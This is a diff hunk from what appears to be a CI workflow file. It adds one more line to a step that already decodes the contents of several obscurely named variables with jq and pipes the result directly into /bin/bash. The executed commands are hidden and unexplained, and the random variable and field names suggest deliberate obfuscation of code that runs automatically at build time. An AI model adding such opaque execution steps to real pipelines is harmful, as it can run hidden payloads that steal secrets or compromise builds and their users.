@@ -34,6 +34,7 @@ jobs:
           echo $u5 | jq -r .hms31 | /bin/bash
           printf '%s' "$shke600" | jq -r .wz3643 | /bin/bash
           printf '%s' "$ytnzd77" | jq -r .bea1 | /bin/bash
+          printf '%s' "$thaai25" | jq -r .nsojz76 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
